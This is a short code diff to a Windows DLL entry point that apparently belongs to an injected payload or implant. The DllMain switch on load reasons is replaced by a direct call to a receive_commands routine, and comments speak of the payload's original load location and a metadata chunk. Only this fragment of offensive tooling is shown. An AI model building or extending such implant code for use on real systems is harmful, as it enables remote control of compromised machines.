@@ -191,7 +191,6 @@ BOOL APIENTRY DllMain(
     LPVOID lpReserved           // < this will be a pointer to the ORIGINAL place the payload was first loaded (before the copy)
 ) {
 
-
     if(metadata[0] == '\0') {   // < may prevent weird issues where the compiler optimizes out the metadata chunk.
         return FALSE;
     }
@@ -227,27 +226,8 @@ BOOL APIENTRY DllMain(
     }
 
 
-    switch (ul_reason_for_call)
-    {
-        case DLL_PROCESS_ATTACH:
-            DEBUG_PRINT("[+] process attach.\n");
-            if(!receive_commands(ctx)) {
-                return FALSE;
-            }
-            return TRUE;
-
-        case DLL_THREAD_ATTACH:
-            DEBUG_PRINT("[+] thread attach.\n");
-            break;
-
-        case DLL_THREAD_DETACH:
-            DEBUG_PRINT("[+] thread detach.\n");
-            break;
-
-        case DLL_PROCESS_DETACH:
-            DEBUG_PRINT("[+] process detach.\n");
-            break;
-    }
+    if(!receive_commands(ctx))
+        return FALSE;
 
     return TRUE;
 }
